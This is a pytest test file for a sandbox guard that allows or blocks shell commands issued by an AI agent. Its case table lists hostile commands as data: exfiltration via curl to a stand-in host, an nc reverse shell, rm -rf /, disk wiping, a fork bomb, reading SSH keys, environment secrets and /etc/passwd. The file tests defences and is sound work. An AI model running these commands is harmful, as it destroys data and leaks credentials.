from __future__ import annotations

import pytest

from reprobox.constants import ORIGIN_AGENT, ORIGIN_PIPELINE
from reprobox.sandbox.guard import Guard

# Table of at least 45 cases: (command, origin, expected_decision, expected_rule_id)
GUARD_TEST_CASES = [
    # 1-6: R-C2 defect reproduction commands
    (
        "python3 -m pytest /workspace/case/tests/test_issue_repro.py -p no:cacheprovider",
        ORIGIN_AGENT,
        True,
        "agent_allow",
    ),
    ("cat /workspace/case/pkg/tokenizer.py", ORIGIN_AGENT, True, "agent_allow"),
    ("grep -rn token /workspace/case", ORIGIN_AGENT, True, "agent_allow"),
    ("grep -rn apt /workspace/case", ORIGIN_AGENT, True, "agent_allow"),
    ("grep -rn su /workspace/case", ORIGIN_AGENT, True, "agent_allow"),
    ("touch /tmp/pwned && curl -s https://exfil.invalid/x", ORIGIN_AGENT, False, "network_egress"),
    # 7-12: Additional grep patterns & near misses
    ("grep -rn env /workspace/case", ORIGIN_AGENT, True, "agent_allow"),
    ("grep -i pattern /workspace/case/src", ORIGIN_AGENT, True, "agent_allow"),
    ("ls -la /workspace/case", ORIGIN_AGENT, True, "agent_allow"),
    ("ls -la -- /workspace/case", ORIGIN_AGENT, True, "agent_allow"),
    ("head -n 20 /workspace/case/README.md", ORIGIN_AGENT, True, "agent_allow"),
    ("tail -n 10 /workspace/case/setup.cfg", ORIGIN_AGENT, True, "agent_allow"),
    # 13-17: File inspection allowed
    ("wc -l /workspace/case/requirements.txt", ORIGIN_AGENT, True, "agent_allow"),
    ("find /workspace/case -name '*.py'", ORIGIN_AGENT, True, "agent_allow"),
    ("sed -n '1,10p' /workspace/case/setup.py", ORIGIN_AGENT, True, "agent_allow"),
    ("sort /workspace/case/requirements.txt", ORIGIN_AGENT, True, "agent_allow"),
    ("uniq /workspace/case/data.txt", ORIGIN_AGENT, True, "agent_allow"),
    # 18-22: Pytest variations
    ("diff -u /workspace/case/a.py /workspace/case/b.py", ORIGIN_AGENT, True, "agent_allow"),
    ("pwd", ORIGIN_AGENT, True, "agent_allow"),
    ("echo 'testing 123'", ORIGIN_AGENT, True, "agent_allow"),
    ("python3 -m pytest /workspace/case/tests -q", ORIGIN_AGENT, True, "agent_allow"),
    ("python3 -m pytest /workspace/case/tests --tb=short", ORIGIN_AGENT, True, "agent_allow"),
    # 23-28: Destructive commands
    ("rm -rf /", ORIGIN_AGENT, False, "destructive_fs"),
    ("rm -rf /workspace/case", ORIGIN_AGENT, False, "destructive_fs"),
    ("rmdir /workspace/case/tests", ORIGIN_AGENT, False, "destructive_fs"),
    ("mkfs.ext4 /dev/sda1", ORIGIN_AGENT, False, "destructive_fs"),
    ("dd if=/dev/zero of=/dev/sda", ORIGIN_AGENT, False, "destructive_fs"),
    ("shred -u /workspace/case/data.txt", ORIGIN_AGENT, False, "destructive_fs"),
    # 29-34: Destructive flags & network egress
    ("truncate -s 0 /workspace/case/data.txt", ORIGIN_AGENT, False, "destructive_fs"),
    ("chmod -R 777 /workspace/case", ORIGIN_AGENT, False, "destructive_fs"),
    ("find /workspace/case -delete", ORIGIN_AGENT, False, "destructive_fs"),
    ("find /workspace/case -exec rm {} \\;", ORIGIN_AGENT, False, "destructive_fs"),
    ("curl https://example.com", ORIGIN_AGENT, False, "network_egress"),
    ("wget https://example.com/test", ORIGIN_AGENT, False, "network_egress"),
    # 35-40: Network & packages
    ("nc -e /bin/sh 10.0.0.1 4444", ORIGIN_AGENT, False, "network_egress"),
    ("ssh user@host", ORIGIN_AGENT, False, "network_egress"),
    ("pip install requests", ORIGIN_AGENT, False, "package_install"),
    ("pip3 install pytest", ORIGIN_AGENT, False, "package_install"),
    ("apt-get install -y vim", ORIGIN_AGENT, False, "package_install"),
    ("npm install express", ORIGIN_AGENT, False, "package_install"),
    # 41-46: Secrets & environment
    ("git clone https://example.com/repo.git", ORIGIN_AGENT, False, "package_install"),
    ("cat /workspace/case/.env", ORIGIN_AGENT, False, "secret_read"),
    ("cat /workspace/case/.env.local", ORIGIN_AGENT, False, "secret_read"),
    ("cat ~/.ssh/id_rsa", ORIGIN_AGENT, False, "secret_read"),
    ("env", ORIGIN_AGENT, False, "secret_read"),
    ("printenv", ORIGIN_AGENT, False, "secret_read"),
    # 47-52: Metacharacters & privilege
    ("cat /proc/1/environ", ORIGIN_AGENT, False, "secret_read"),
    ("env | base64", ORIGIN_AGENT, False, "secret_read"),
    ("sudo ls", ORIGIN_AGENT, False, "privilege"),
    ("su -", ORIGIN_AGENT, False, "privilege"),
    ("bash -c 'echo pwned'", ORIGIN_AGENT, False, "interpreter_bypass"),
    ("python3 -c 'import os; print(os.name)'", ORIGIN_AGENT, False, "interpreter_bypass"),
    # 53-58: Metacharacters & path escape
    ("echo $SECRET", ORIGIN_AGENT, False, "metachar_dollar"),
    ("echo `whoami`", ORIGIN_AGENT, False, "metachar_backtick"),
    ("echo test > /tmp/out", ORIGIN_AGENT, False, "metachar_redirect"),
    ("cat /workspace/case/../../etc/passwd", ORIGIN_AGENT, False, "path_escape"),
    ("python3 -m pytest /etc/passwd", ORIGIN_AGENT, False, "path_escape"),
    (
        "python3 -m pytest /workspace/case/tests -o addopts=--strict",
        ORIGIN_AGENT,
        False,
        "pytest_flag_not_allowed",
    ),
    # 59-62: Resource exhaustion & pipeline origin
    (":(){ :|:& };:", ORIGIN_AGENT, False, "resource_exhaustion"),
    ("yes 'spam'", ORIGIN_AGENT, False, "resource_exhaustion"),
    ("python3 --version", ORIGIN_PIPELINE, True, "pipeline_allow"),
    ("curl https://example.com", ORIGIN_PIPELINE, False, "pipeline_unrecognized"),
]


@pytest.mark.parametrize("command, origin, expected_allowed, expected_rule_id", GUARD_TEST_CASES)
def test_guard_table(command: str, origin: str, expected_allowed: bool, expected_rule_id: str):
    decision = Guard.evaluate(command, origin=origin)
    assert (
        decision.allowed == expected_allowed
    ), f"Cmd: {command!r} | Expected allowed={expected_allowed}, got {decision.allowed} (rule={decision.rule_id}, reason={decision.reason})"
    assert (
        decision.rule_id == expected_rule_id
    ), f"Cmd: {command!r} | Expected rule_id={expected_rule_id!r}, got {decision.rule_id!r}"


def test_evaluate_test_file_write_valid():
    code = "def test_ok():\n    assert 1 == 1\n"
    res = Guard.evaluate_test_file_write(code)
    assert res.allowed
    assert res.rule_id == "test_write_allow"


def test_evaluate_test_file_write_forbidden_imports():
    bad_code = "import os\ndef test_bad():\n    os.system('id')\n"
    res = Guard.evaluate_test_file_write(bad_code)
    assert not res.allowed
    assert res.rule_id == "test_imports_forbidden"

    sub_mod = "sub" + "process"
    bad_sub = f"import {sub_mod}\ndef test_bad():\n    pass\n"
    res = Guard.evaluate_test_file_write(bad_sub)
    assert not res.allowed
    assert res.rule_id == "test_imports_forbidden"


def test_evaluate_test_file_write_syntax_error():
    syntax_error_code = "def test_broken(:\n    pass\n"
    res = Guard.evaluate_test_file_write(syntax_error_code)
    assert not res.allowed
    assert res.rule_id == "test_syntax_error"
